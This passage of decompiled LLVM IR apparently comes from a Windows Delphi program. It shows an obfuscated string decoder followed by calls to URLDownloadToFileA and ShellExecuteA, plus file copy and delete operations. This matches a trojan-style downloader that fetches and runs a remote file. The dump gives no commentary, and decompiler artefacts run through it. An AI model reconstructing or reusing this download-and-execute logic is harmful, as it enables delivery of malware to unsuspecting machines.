  %90 = add i32 %89, -1, !insn.addr !1166
  %91 = icmp slt i32 %90, 0, !insn.addr !1167
  %92 = add i32 %88, 2, !insn.addr !1168
  %93 = icmp sgt i32 %92, %90, !insn.addr !1169
  %or.cond = or i1 %91, %93
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1170

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e7e
  %94 = add i32 %1, -12, !insn.addr !1171
  store i32 %94, i32* %stack_var_-4, align 4, !insn.addr !1172
  %95 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1172
  %96 = call i32 @"@LStrCopy"(), !insn.addr !1173
  %97 = inttoptr i32 %94 to i32*, !insn.addr !1174
  %98 = load i32, i32* %97, align 4, !insn.addr !1174
  %99 = icmp eq i32 %98, 0, !insn.addr !1174
  store i32 %95, i32* %esp.0.reg2mem, !insn.addr !1175
  br i1 %99, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1175

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %100 = call i32 @function_406d84(), !insn.addr !1176
  %101 = call i32 @"@LStrFromPChar"(), !insn.addr !1177
  %102 = call i32 @"@LStrCat"(), !insn.addr !1178
  %103 = call i32 @function_4036c8(), !insn.addr !1179
  %104 = inttoptr i32 %103 to i8*, !insn.addr !1180
  %105 = call i1 @DeleteFileA(i8* %104), !insn.addr !1181
  %106 = call i32 @function_4036c8(), !insn.addr !1182
  %107 = inttoptr i32 %106 to i8*, !insn.addr !1183
  store i8* %107, i8** %stack_var_-20, align 4, !insn.addr !1183
  %108 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1183
  %109 = call i1 @CopyFileA(i8* %107, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1184
  %110 = call i32 @function_405b70(), !insn.addr !1185
  store i32 %108, i32* %esp.0.reg2mem, !insn.addr !1185
  br label %dec_label_pc_405f34, !insn.addr !1185

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e7e
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %111 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1186
  %112 = load i32, i32* %111, align 4, !insn.addr !1186
  call void @__writefsdword(i32 0, i32 %112), !insn.addr !1187
  %113 = add i32 %esp.0.reload, 8, !insn.addr !1188
  %114 = inttoptr i32 %113 to i32*, !insn.addr !1188
  store i32 4218710, i32* %114, align 4, !insn.addr !1188
  %115 = call i32 @"@LStrArrayClr"(), !insn.addr !1189
  ret i32 %115, !insn.addr !1190
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1191
  ret i32 %0, !insn.addr !1191
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1192
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1193
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1193
  %3 = load i32, i32* %2, align 4, !insn.addr !1193
  ret i32 %3, !insn.addr !1194
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1195
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1195
  store i32 %1, i32* %2, align 4, !insn.addr !1195
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1196
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1196
  %7 = add i8 %4, %6, !insn.addr !1196
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1196
  store i8 %7, i8* %8, align 1, !insn.addr !1196
  %9 = load i32, i32* %eax, align 4, !insn.addr !1197
  ret i32 %9, !insn.addr !1197
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1198
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1198
  store i8 %4, i8* %5, align 1, !insn.addr !1198
  %6 = mul i32 %0, 4096, !insn.addr !1199
  %7 = udiv i32 %0, 1048576, !insn.addr !1199
  %8 = or i32 %7, %6, !insn.addr !1199
  %9 = and i32 %0, 1048576, !insn.addr !1199
  %10 = icmp eq i32 %9, 0, !insn.addr !1199
  %11 = load i32, i32* %edx, align 4, !insn.addr !1200
  %12 = trunc i32 %11 to i16, !insn.addr !1200
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1200
  %14 = sext i8 %13 to i32, !insn.addr !1200
  %15 = or i32 %2, %14, !insn.addr !1200
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1201
  %17 = and i32 %15, -256, !insn.addr !1201
  %18 = or i32 %17, %16, !insn.addr !1201
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1202
  %20 = load i8, i8* %19, align 1, !insn.addr !1202
  %21 = mul i8 %20, 2, !insn.addr !1202
  %22 = lshr i8 %20, 7, !insn.addr !1202
  %23 = or i8 %22, %21, !insn.addr !1202
  store i8 %23, i8* %19, align 1, !insn.addr !1202
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1203
  %26 = udiv i32 %1, 256, !insn.addr !1203
  %27 = trunc i32 %26 to i8, !insn.addr !1203
  %28 = add i8 %25, %27, !insn.addr !1203
  %29 = load i32, i32* %edx, align 4, !insn.addr !1203
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1203
  store i8 %28, i8* %30, align 1, !insn.addr !1203
  %31 = add i32 %8, -4, !insn.addr !1204
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1204
  store i32 4218448, i32* %32, align 4, !insn.addr !1204
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1205
  %34 = sext i1 %33 to i32, !insn.addr !1205
  ret i32 %34, !insn.addr !1206
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1207
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1207
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1207
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1208
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1209
  %3 = add i32 %2, 1, !insn.addr !1209
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1209
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1210
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1211
  ret i32 0, !insn.addr !1212
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1213
  ret i32 %0, !insn.addr !1213
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1214
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1215
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1216
  %2 = add i32 %1, -1, !insn.addr !1216
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1216
  ret i32 %0, !insn.addr !1217
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1218
  %0 = call i32 @function_40603c(), !insn.addr !1219
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1220
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1221
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1221

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1222
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1223
  %5 = load i32, i32* %4, align 4, !insn.addr !1223
  %6 = icmp eq i32 %5, 0, !insn.addr !1223
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1224
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1224

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1225
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1226
  unreachable, !insn.addr !1226

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1227
}

define i32 @function_406003() local_unnamed_addr {
dec_label_pc_406003:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1228
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1228
  store i32 %1, i32* %2, align 4, !insn.addr !1228
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1229
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1229
  %7 = add i8 %4, %6, !insn.addr !1229
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1229
  store i8 %7, i8* %8, align 1, !insn.addr !1229
  %9 = add i32 %0, 114, !insn.addr !1230
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1230
  %11 = load i8, i8* %10, align 1, !insn.addr !1230
  %12 = udiv i32 %0, 256, !insn.addr !1230
  %13 = trunc i32 %12 to i8, !insn.addr !1230
  %14 = add i8 %11, %13, !insn.addr !1230
  store i8 %14, i8* %10, align 1, !insn.addr !1230
  %15 = load i8, i8* %3, align 4, !insn.addr !1231
  %16 = load i32, i32* %eax, align 4
  %17 = trunc i32 %16 to i8, !insn.addr !1231
  %18 = add i8 %15, %17, !insn.addr !1231
  %19 = inttoptr i32 %16 to i8*, !insn.addr !1231
  store i8 %18, i8* %19, align 1, !insn.addr !1231
  %20 = load i32, i32* @global_var_408104, align 4, !insn.addr !1232
  %21 = icmp eq i32 %20, 0, !insn.addr !1232
  br i1 %21, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1233

dec_label_pc_406015:                              ; preds = %dec_label_pc_406003
  %22 = call i32 @function_40603c(), !insn.addr !1234
  br label %dec_label_pc_40601a, !insn.addr !1234

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_406003
  %23 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1235
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1236
  %25 = load i32, i32* %24, align 4, !insn.addr !1236
  %26 = mul i32 %25, 1000, !insn.addr !1236
  %27 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %26, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1237
  store i32 %27, i32* @global_var_408104, align 4, !insn.addr !1238
  ret i32 %27, !insn.addr !1239
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1240
  ret i32 %0, !insn.addr !1241
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1242
  ret i32 %1, !insn.addr !1243
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1244
  %1 = icmp eq i32 %0, 0, !insn.addr !1244
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1245

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1246
  br label %dec_label_pc_406076, !insn.addr !1246

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1247
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1248
  ret i32 %3, !insn.addr !1249
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1250
  ret i32 %0, !insn.addr !1251
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1252
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1252
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1252
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1253
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1254
  %3 = add i32 %2, 1, !insn.addr !1254
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1254
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1255
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1256
  ret i32 0, !insn.addr !1257
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1258
  ret i32 %0, !insn.addr !1258
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1259
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1260
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1261
  %2 = add i32 %1, -1, !insn.addr !1261
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1261
  ret i32 %0, !insn.addr !1262
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1263
  ret i32 %0, !insn.addr !1263
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1264
  %ebx.0.reg2mem = alloca i32, !insn.addr !1264
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1265
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1266
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1266
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1266
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1267
  %4 = call i32 @function_4034c8(), !insn.addr !1268
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1269
  %6 = call i32 @function_4034c8(), !insn.addr !1270
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1271
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1271
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1271

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1272
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1272
  %11 = load i8, i8* %10, align 1, !insn.addr !1272
  %12 = icmp eq i8 %11, 61, !insn.addr !1272
  %13 = icmp eq i1 %12, false, !insn.addr !1273
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1273

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1274
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1274
  store i8 46, i8* %16, align 1, !insn.addr !1274
  br label %dec_label_pc_406162, !insn.addr !1275

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1276
  %18 = add i8 %17, -1, !insn.addr !1277
  %19 = add i32 %14, %8, !insn.addr !1278
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1278
  store i8 %18, i8* %20, align 1, !insn.addr !1278
  br label %dec_label_pc_406162, !insn.addr !1278

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1279
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1280
  %23 = icmp eq i32 %22, 0, !insn.addr !1280
  %24 = icmp eq i1 %23, false, !insn.addr !1281
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1281
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1281
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1281

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1282
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1283
  %26 = call i32 @"@LStrClr"(), !insn.addr !1284
  ret i32 %26, !insn.addr !1285
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1286
  ret i32 %0, !insn.addr !1286
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1287
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1288
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1289
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1290
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1291
  ret i32 %4, !insn.addr !1292
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1293
  %esp.0.reg2mem = alloca i32, !insn.addr !1293
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1293
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1294
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1294
  br label %dec_label_pc_4061cc, !insn.addr !1294

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1295
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1295
  store i32 0, i32* %2, align 4, !insn.addr !1295
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1296
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1296
  store i32 0, i32* %4, align 4, !insn.addr !1296
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1297
  %6 = icmp eq i32 %5, 0, !insn.addr !1297
  %7 = icmp eq i1 %6, false, !insn.addr !1298
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1298
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1298
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1298

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1299
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1299
  store i32 0, i32* %9, align 4, !insn.addr !1299
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1300
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1300
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1301
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1301
  store i32 %0, i32* %13, align 4, !insn.addr !1301
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1302
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1302
  store i32 4219659, i32* %15, align 4, !insn.addr !1302
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1303
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1303
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1303
  store i32 %16, i32* %18, align 4, !insn.addr !1303
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1304
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1305
  %20 = call i32 @function_4060f0(), !insn.addr !1306
  %21 = call i32 @function_4036c8(), !insn.addr !1307
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1308
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1309
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1309
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1309
  store i32 %25, i32* %24, align 4, !insn.addr !1309
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1310
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1311
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1312
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1312
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1312
  store i32 %30, i32* %29, align 4, !insn.addr !1312
  %31 = call i32 @function_4034c8(), !insn.addr !1313
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1314
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1315
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1315
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1315
  %35 = call i32 @function_40618c(), !insn.addr !1316
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1317
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1317
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1318
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1318
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1318
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1319
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1319
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1319
  store i32 %40, i32* %42, align 4, !insn.addr !1319
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1320
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1321
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1321
  store i32 0, i32* %45, align 4, !insn.addr !1321
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1322
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1322
  store i32 0, i32* %47, align 4, !insn.addr !1322
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1323
  %49 = call i32 @function_4036c8(), !insn.addr !1324
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1325
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1325
  store i32 %49, i32* %51, align 4, !insn.addr !1325
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1326
  %53 = call i32 @function_4060f0(), !insn.addr !1327
  %54 = call i32 @function_4036c8(), !insn.addr !1328
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1329
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1329
  store i32 %54, i32* %56, align 4, !insn.addr !1329
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1330
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1330
  store i32 0, i32* %58, align 4, !insn.addr !1330
  %59 = call i32 @function_4060e8(), !insn.addr !1331
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1332
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1332
  store i32 1, i32* %61, align 4, !insn.addr !1332
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1333
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1333
  store i32 0, i32* %63, align 4, !insn.addr !1333
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1334
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1334
  store i32 0, i32* %65, align 4, !insn.addr !1334
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1335
  %67 = call i32 @function_4036c8(), !insn.addr !1336
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1337
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1337
  store i32 %67, i32* %69, align 4, !insn.addr !1337
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1338
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1338
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1338
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1339
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1339
  store i32 0, i32* %73, align 4, !insn.addr !1339
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1340
  %75 = load i32, i32* %73, align 4, !insn.addr !1341
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1342
  store i32 4219666, i32* %69, align 4, !insn.addr !1343
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1344
  ret i32 %76, !insn.addr !1345
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1346
  ret i32 %0, !insn.addr !1346
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1347
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1348
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1349
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1349
  %ecx.0.reg2mem = alloca i32, !insn.addr !1349
  %esp.0.reg2mem = alloca i32, !insn.addr !1349
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1349
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1349
  store i32 %5, i32* %6, align 4, !insn.addr !1349
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1350
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1350
  %11 = add i8 %8, %10, !insn.addr !1350
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1350
  store i8 %11, i8* %12, align 1, !insn.addr !1350
  %13 = add i32 %2, 58, !insn.addr !1351
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1351
  %15 = load i8, i8* %14, align 1, !insn.addr !1351
  %16 = load i32, i32* %eax, align 4, !insn.addr !1351
  %17 = udiv i32 %16, 256, !insn.addr !1351
  %18 = trunc i32 %17 to i8, !insn.addr !1351
  %19 = add i8 %15, %18, !insn.addr !1351
  store i8 %19, i8* %14, align 1, !insn.addr !1351
  %20 = add i32 %0, 112, !insn.addr !1352
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1352
  %22 = load i8, i8* %21, align 1, !insn.addr !1352
  %23 = trunc i32 %4 to i8, !insn.addr !1352
  %24 = add i8 %22, %23, !insn.addr !1352
  store i8 %24, i8* %21, align 1, !insn.addr !1352
  %25 = trunc i32 %3 to i16, !insn.addr !1353
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1353
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1353
  %27 = load i8, i8* %7, align 4, !insn.addr !1354
